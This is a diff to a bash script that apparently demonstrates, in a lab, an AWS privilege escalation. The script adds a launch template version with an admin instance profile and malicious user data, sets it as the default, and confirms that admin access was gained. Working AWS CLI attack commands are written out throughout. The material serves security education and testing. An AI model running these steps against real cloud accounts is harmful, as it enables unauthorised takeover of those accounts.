@@ -5,7 +5,9 @@
 # launch template to launch instances with an admin role, using malicious user data
 # to grant admin access to the starting user.
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -13,6 +15,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-ec2-005-to-admin-starting-user"
@@ -73,6 +93,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -84,6 +105,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd aws sts get-caller-identity --query 'Account' --output text
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -91,6 +113,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd aws iam list-users --max-items 1
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -103,6 +126,7 @@ echo -e "${YELLOW}Step 5: Inspecting the victim launch template${NC}"
 echo "Target launch template: $VICTIM_TEMPLATE_NAME"
 echo ""
 
+show_cmd aws ec2 describe-launch-templates --region "$AWS_REGION" --launch-template-names "$VICTIM_TEMPLATE_NAME" --query 'LaunchTemplates[0]' --output json
 TEMPLATE_INFO=$(aws ec2 describe-launch-templates \
     --region $AWS_REGION \
     --launch-template-names $VICTIM_TEMPLATE_NAME \
@@ -116,6 +140,7 @@ echo "Launch Template ID: $TEMPLATE_ID"
 echo "Current Default Version: $ORIGINAL_DEFAULT_VERSION"
 
 # Get current version details
+show_cmd aws ec2 describe-launch-template-versions --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --versions '\$Default' --query 'LaunchTemplateVersions[0].LaunchTemplateData' --output json
 CURRENT_VERSION_INFO=$(aws ec2 describe-launch-template-versions \
     --region $AWS_REGION \
     --launch-template-id $TEMPLATE_ID \
@@ -167,6 +192,7 @@ CURRENT_AMI=$(echo "$CURRENT_VERSION_INFO" | jq -r '.ImageId')
 CURRENT_INSTANCE_TYPE=$(echo "$CURRENT_VERSION_INFO" | jq -r '.InstanceType')
 
 # Create new version with admin profile and malicious user data
+show_attack_cmd aws ec2 create-launch-template-version --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --source-version "$ORIGINAL_DEFAULT_VERSION" --launch-template-data "{\"ImageId\": \"$CURRENT_AMI\", \"InstanceType\": \"$CURRENT_INSTANCE_TYPE\", \"IamInstanceProfile\": {\"Name\": \"$TARGET_ADMIN_PROFILE\"}, \"UserData\": \"$USER_DATA_B64\", \"InstanceMarketOptions\": {\"MarketType\": \"spot\", \"SpotOptions\": {\"MaxPrice\": \"0.02\", \"SpotInstanceType\": \"one-time\"}}}" --output json
 NEW_VERSION_OUTPUT=$(aws ec2 create-launch-template-version \
     --region $AWS_REGION \
     --launch-template-id $TEMPLATE_ID \
@@ -203,6 +229,7 @@ echo -e "${YELLOW}Step 8: Modifying launch template to set new version as defaul
 echo "Using ec2:ModifyLaunchTemplate to update the default version..."
 echo ""
 
+show_attack_cmd aws ec2 modify-launch-template --region "$AWS_REGION" --launch-template-id "$TEMPLATE_ID" --default-version "$NEW_VERSION_NUMBER" --output text
 aws ec2 modify-launch-template \
     --region $AWS_REGION \
     --launch-template-id $TEMPLATE_ID \
@@ -246,6 +273,7 @@ while [ $WAIT_TIME -lt $MAX_WAIT ]; do
 
     if [ "$INSTANCE_COUNT" -gt 0 ]; then
         INSTANCE_ID=$(echo "$ASG_INSTANCES" | jq -r '.[0].InstanceId')
+        show_cmd aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].State.Name' --output text
         INSTANCE_STATE=$(aws ec2 describe-instances \
             --region $AWS_REGION \
             --instance-ids $INSTANCE_ID \
@@ -310,6 +338,7 @@ echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
 echo "The starting user now has AdministratorAccess attached..."
 echo "Attempting to list IAM users..."
 
+show_cmd aws iam list-users --max-items 3 --output table
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -336,6 +365,13 @@ echo "  $STARTING_USER → CreateLaunchTemplateVersion (admin role + malicious u
 echo "  → ModifyLaunchTemplate (set default version) → Instance Launch"
 echo "  → User Data Execution → AttachUserPolicy AdministratorAccess → Admin Access"
 
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- Modified launch template: $TEMPLATE_ID"
 echo "- New malicious version: $NEW_VERSION_NUMBER"
@@ -351,3 +387,6 @@ echo ""
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
 echo "  ./cleanup_attack.sh"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
